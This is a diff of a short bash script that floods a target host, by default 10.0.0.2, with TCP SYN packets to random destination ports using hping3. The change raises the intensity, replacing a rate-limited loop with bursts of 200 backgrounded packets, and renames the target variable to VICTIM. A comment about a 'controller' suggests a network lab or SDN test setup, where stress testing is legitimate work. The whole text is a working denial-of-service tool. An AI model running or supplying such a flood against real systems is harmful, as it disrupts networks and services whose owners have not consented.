@@ -1,21 +1,18 @@
 #!/usr/bin/env bash
 set -euo pipefail
 
-TARGET="${1:-10.0.0.2}"
-RATE="${2:-200}"      # packets per second-ish (roughly)
-SLEEP="0.005"         # 0.005s ~ 200/s
+VICTIM="${1:-10.0.0.2}"
 
-echo "[+] New-flow flood against ${TARGET} (TCP SYN to random dst ports)"
+echo "[+] New-flow flood against ${VICTIM} (TCP SYN to random dst ports)"
 echo "    Stop with Ctrl+C"
 
-command -v hping3 >/dev/null 2>&1 || {
-  echo "[-] hping3 not installed. Install on host: sudo apt install -y hping3"
-  exit 1
-}
-
+# Increase intensity: many unique dst ports quickly
 while true; do
-  PORT=$(( (RANDOM % 64511) + 1024 ))
-  # send 1 SYN packet to random dst port
-  hping3 -S -c 1 -p "${PORT}" "${TARGET}" >/dev/null 2>&1 || true
-  sleep "${SLEEP}"
+  # 200 SYNs burst
+  for i in $(seq 1 200); do
+    PORT=$(( (RANDOM % 30000) + 1000 ))
+    hping3 -S -c 1 -p "$PORT" "$VICTIM" >/dev/null 2>&1 &
+  done
+  # small pause to let controller process
+  sleep 0.1
 done
